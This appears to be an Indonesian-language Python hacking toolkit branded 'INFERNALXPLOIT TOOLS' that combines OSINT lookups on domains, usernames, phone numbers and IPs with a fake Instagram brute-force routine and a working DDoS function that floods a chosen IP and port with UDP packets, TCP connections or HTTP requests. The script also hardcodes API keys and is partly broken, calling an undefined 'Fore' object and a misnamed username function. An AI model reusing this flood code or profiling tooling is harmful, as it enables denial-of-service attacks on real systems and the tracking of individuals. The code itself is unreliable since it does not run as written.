import os
import sys
import time
import socket
import requests
import whois
import subprocess

# API Keys
HUNTER_API_KEY = "4ac70689478493c9647501ddbb10cf6a1f5f9fba"
APILAYER_API_KEY = "JWBHnCVvinVgXfidkF1gEjTfF6680jb5"

# Warna
WHITE = "\033[97m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Clear screen dan putar lagu
os.system("clear")
try:
    music_process = subprocess.Popen(["mpv", "--loop=inf", "P.mp3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except FileNotFoundError:
    print(f"{RED}[WARNING] MPV tidak ditemukan!{RESET}")
    music_process = None

# Banner
print(f"{GREEN}INFERNALXPLOIT TOOLS{RESET}")
print(f"{WHITE}Instagram: @InfernalXploit | TikTok: @renxploit1{RESET}")
print("=" * 40)

# **OSINT Website**
def osint_website(domain):
    print(f"{GREEN}[+] Menganalisis website: {domain}{RESET}")
    
    # **Cek HTTP Headers**
    try:
        response = requests.get(f"http://{domain}")
        print(f"{WHITE}[+] HTTP Headers:{RESET}")
        for k, v in response.headers.items():
            print(f"  {k}: {v}")
    except Exception as e:
        print(f"{RED}[-] Gagal mendapatkan header: {e}{RESET}")

    # **Cek WHOIS**
    try:
        w = whois.whois(domain)
        print(f"{WHITE}[+] WHOIS Data:{RESET}")
        print(f"  Registrar: {w.registrar}")
        print(f"  Expired: {w.expiration_date}")
    except Exception:
        print(f"{RED}[-] WHOIS gagal{RESET}")

    # **Cari Email (Hunter.io)**
    try:
        url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={HUNTER_API_KEY}"
        data = requests.get(url).json()
        emails = data["data"]["emails"]
        print(f"{WHITE}[+] Email terkait:{RESET}")
        for email in emails:
            print(f"  {email['value']} - {email['type']}")
    except Exception:
        print(f"{RED}[-] Tidak ada email ditemukan{RESET}")

# **OSINT Username**

def cari_username(username):
    print(Fore.GREEN + f"\n[+] Mencari username: {username}...\n")

    platform_sosial = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Facebook": f"https://www.facebook.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Pinterest": f"https://www.pinterest.com/{username}/",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "Snapchat": f"https://www.snapchat.com/add/{username}",
        "YouTube": f"https://www.youtube.com/{username}",
        "Twitch": f"https://www.twitch.tv/{username}",
        "Steam": f"https://steamcommunity.com/id/{username}",
        "DeviantArt": f"https://www.deviantart.com/{username}",
        "Flickr": f"https://www.flickr.com/people/{username}",
        "SoundCloud": f"https://soundcloud.com/{username}",
        "Dribbble": f"https://dribbble.com/{username}",
        "Medium": f"https://medium.com/@{username}",
        "Tumblr": f"https://{username}.tumblr.com",
        "VK": f"https://vk.com/{username}",
        "Blogger": f"https://www.blogger.com/profile/{username}",
        "WordPress": f"https://{username}.wordpress.com",
        "Replit": f"https://replit.com/@{username}",
        "CodePen": f"https://codepen.io/{username}",
        "500px": f"https://500px.com/{username}",
        "AskFM": f"https://ask.fm/{username}",
        "Badoo": f"https://badoo.com/profile/{username}",
        "BitBucket": f"https://bitbucket.org/{username}/",
        "CashApp": f"https://cash.app/${username}",
        "DailyMotion": f"https://www.dailymotion.com/{username}",
        "Discogs": f"https://www.discogs.com/user/{username}",
        "Goodreads": f"https://www.goodreads.com/{username}",
        "Gravatar": f"https://en.gravatar.com/{username}",
        "Keybase": f"https://keybase.io/{username}",
        "MyAnimeList": f"https://myanimelist.net/profile/{username}",
        "NPMJS": f"https://www.npmjs.com/~{username}",
        "Patreon": f"https://www.patreon.com/{username}",
        "ProductHunt": f"https://www.producthunt.com/@{username}",
        "Quora": f"https://www.quora.com/profile/{username}",
        "Roblox": f"https://www.roblox.com/user.aspx?username={username}",
        "Scribd": f"https://www.scribd.com/{username}",
        "SourceForge": f"https://sourceforge.net/u/{username}/profile/",
        "Spotify": f"https://open.spotify.com/user/{username}",
        "Trello": f"https://trello.com/{username}",
        "Unsplash": f"https://unsplash.com/@{username}",
        "Vimeo": f"https://vimeo.com/{username}",
        "WeHeartIt": f"https://weheartit.com/{username}",
        "LiveJournal": f"https://{username}.livejournal.com",
        "AngelList": f"https://angel.co/{username}",
        "Flipboard": f"https://flipboard.com/@{username}",
        "Mix": f"https://mix.com/{username}",
    }

    for platform, url in platform_sosial.items():
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            if response.status_code == 200:
                print(Fore.GREEN + f"[*] Ditemukan di {platform}: {url}")
            else:
                print(Fore.RED + f"[-] Tidak ditemukan di {platform}")
        except requests.exceptions.RequestException:
            print(Fore.RED + f"[!] Error saat mengecek {platform}")

        time.sleep(1)

# **OSINT Nomor (Apilayer)**
def osint_number(number):
    try:
        url = f"https://api.apilayer.com/number_verification/validate?number={number}"
        headers = {"apikey": APILAYER_API_KEY}
        data = requests.get(url, headers=headers).json()
        print(f"{WHITE}[+] Info Nomor {number}:{RESET}")
        print(f"  Lokasi: {data['location']}")
        print(f"  Operator: {data['carrier']}")
    except Exception:
        print(f"{RED}[-] Tidak bisa mendapatkan info nomor{RESET}")

# **Lacak IP**
def lacak_ip(ip):
    try:
        url = f"http://ip-api.com/json/{ip}"
        data = requests.get(url).json()
        print(f"{WHITE}[+] Info IP {ip}:{RESET}")
        print(f"  Negara: {data['country']}")
        print(f"  Kota: {data['city']}")
        print(f"  ISP: {data['isp']}")
    except Exception:
        print(f"{RED}[-] Gagal mendapatkan info IP{RESET}")

# **Brute Force Instagram**
def brute_force_instagram(username, password_file):
    try:
        with open(password_file, "r") as file:
            passwords = file.readlines()
        print(f"{GREEN}[+] Memulai brute force pada {username}{RESET}")
        for password in passwords:
            password = password.strip()
            print(f"{WHITE}Mencoba: {password}{RESET}")
            time.sleep(1)  # Simulasi
        print(f"{RED}[-] Semua password gagal{RESET}")
    except FileNotFoundError:
        print(f"{RED}[-] File password tidak ditemukan{RESET}")

# **DDoS Attack**
def ddos_attack(ip, port, duration, attack_type):
    start_time = time.time()
    if attack_type == "UDP":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = b"1337 Attack"
        while time.time() - start_time < duration:
            sock.sendto(message, (ip, port))
            print(f"{WHITE}[+] Mengirim UDP ke {ip}:{port}{RESET}")
    elif attack_type == "SYN":
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.close()
                print(f"{WHITE}[+] SYN Sent {RESET}")
            except:
                pass
    elif attack_type == "HTTP":
        http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.sendall(http_request)
                sock.close()
                print(f"{WHITE}[+] HTTP Request Sent{RESET}")
            except:
                pass
    print(f"{RED}[-] Serangan selesai{RESET}")

# **Menu**
def main():
    print(f"{WHITE}Pilih fitur:{RESET}")
    print("1. OSINT Website")
    print("2. OSINT Username")
    print("3. OSINT Nomor Telepon")
    print("4. Lacak IP")
    print("5. Brute Force Instagram")
    print("6. DDoS Attack")
    choice = input(f"{GREEN}[+] Pilihan: {RESET}")

    if choice == "1":
        domain = input("Masukkan domain: ")
        osint_website(domain)
    elif choice == "2":
        username = input("Masukkan username: ")
        osint_username(username)
    elif choice == "3":
        number = input("Masukkan nomor: ")
        osint_number(number)
    elif choice == "4":
        ip = input("Masukkan IP: ")
        lacak_ip(ip)
    elif choice == "5":
        username = input("Masukkan username IG: ")
        password_file = input("Masukkan file password.txt: ")
        brute_force_instagram(username, password_file)
    elif choice == "6":
        ip = input("Masukkan target IP: ")
        port = int(input("Masukkan port: "))
        duration = int(input("Masukkan durasi: "))
        attack_type = input("Jenis serangan (UDP/SYN/HTTP): ").upper()
        ddos_attack(ip, port, duration, attack_type)

if __name__ == "__main__":
    main()
    if music_process:
        music_process.terminate()
